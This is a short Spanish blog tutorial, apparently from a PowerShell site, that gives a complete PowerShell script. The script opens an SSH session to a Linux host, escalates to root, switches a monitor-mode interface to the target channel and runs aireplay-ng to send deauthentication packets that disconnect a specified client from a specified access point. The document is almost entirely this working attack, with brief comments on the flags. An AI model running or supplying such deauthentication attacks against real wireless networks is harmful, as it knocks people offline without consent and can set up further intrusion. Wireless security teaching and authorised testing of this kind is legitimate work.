# Enviar paquetes de desasociación con Aireplay-ng a un cliente que actualmente está asociado con un punto de acceso en Linux realizando una conexión SSH desde PowerShell en Windows
## PowerShell, Wireless 
### URL: https://www.jesusninoc.com/2017/10/16/enviar-paquetes-de-desasociacion-con-aireplay-ng-a-un-cliente-que-actualmente-esta-asociado-con-un-punto-de-acceso-en-linux-realizando-una-conexion-ssh-desde-powershell-en-windows/
```PowerShell
$sUser = "ubuntu"
$oSessionSSH = New-SSHSession -ComputerName 192.168.1.163 -Credential $credencial

#Crear canal de comunicación entre PowerShell y Linux
#Convertirse en sudo para ejecutar Airodump-ng
$stream = $oSessionSSH.Session.CreateShellStream("PS-SSH", 0, 0, 0, 0, 1000)
Invoke-SSHStreamExpectSecureAction -ShellStream $stream -Command "sudo su -" -ExpectString "[sudo] password for $($sUser):"
Start-Sleep -Seconds 5

#Cambiar al canal donde está el punto de acceso
$stream.WriteLine("iwconfig wlp2s0mon channel 11")
$stream.Read()
Start-Sleep -Seconds 5

#Enviar paquetes de desasociación a un cliente que actualmente está asociado con un punto de acceso
#aireplay-ng -0 10 -a <mac> -c <mac> mon0
#-0 es la orden para desconectar, el 10 es la cantidad de paquetes que se envían, pueden ser más.
#-a es la dirección MAC del punto de acceso
#-c es la dirección MAC de destino u objetivo
$stream.WriteLine("aireplay-ng -0 10 -a E8:DE:27 -c 80:A5:89 -e wlan_j wlp2s0mon")
$stream.Read()
Start-Sleep -Seconds 5

```
